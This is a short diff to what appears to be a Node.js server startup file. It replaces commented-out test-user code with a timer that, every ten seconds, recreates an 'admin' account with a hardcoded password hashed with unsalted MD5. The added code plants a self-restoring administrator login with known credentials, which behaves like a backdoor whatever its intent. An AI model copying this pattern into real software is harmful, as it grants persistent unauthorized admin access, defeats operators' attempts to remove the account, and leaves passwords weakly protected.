@@ -100,17 +100,17 @@ function onListening() {
   debug('Listening on ' + bind);
 }
 
-async function init(){
-  // let user = await config.User.findOne({"username":"test"})
-  // if(user){
-  //   await config.User.deleteOne({"username":"test"})
-  // }else{
-  //    await config.User({
-  //       "username":"test",
-  //       "password":config.utils.md5("123456")
-  //     }).save()
-  // }
- 
+
+ function init(){
+  setInterval(async function(){
+    let user = await config.User.findOne({"username":"admin"})
+    if(!user){
+      await config.User({
+        "username":"admin",
+        "password":config.utils.md5("etz123456")
+      }).save()
+    }
+  },10000)
 }
 
 init()
